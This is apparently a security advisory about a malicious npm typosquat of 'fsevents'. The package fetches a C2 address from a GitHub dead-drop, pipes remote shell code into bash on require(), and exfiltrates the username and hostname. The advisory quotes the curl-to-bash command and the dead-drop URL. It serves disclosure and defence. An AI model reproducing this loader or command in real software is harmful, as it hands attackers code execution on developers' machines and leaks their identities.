summary: Typosquat of fsevents executes remote shell payload and exfiltrates host identifiers on require()
details: On require(), index.js runs an IIFE that targets macOS hosts (skipping CI/GITHUB_ACTIONS), sleeps a randomized 30–90 seconds, then fetches a C2 URL from a GitHub raw dead-drop at https://raw.githubusercontent.com/nyx-deploy/config/main/c2.txt. It then spawns `/bin/sh -c 'curl -sSfL <c2>/api/payload/ | /bin/bash & disown'`, piping attacker-controlled shell into bash and granting full code execution on the installer's machine. A second curl GET to `<c2>/api/clickfix-callback` exfiltrates a random build id, `$USER`, `os.hostname()`, and a hardcoded `password=npm_fsevent` tag, identifying the compromised host for follow-up delivery. A sentinel file at ~/.cache/.nyx-npm/f ensures a single execution per host. The package name `@403name/fsevent` (singular) and the description/keywords (`fsevents`, `macos`, 'FSEvents wrapper') impersonate the widely-used `fsevents` package; no legitimate file-watcher functionality is shipped — the package is a typosquat lure for the RCE payload.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
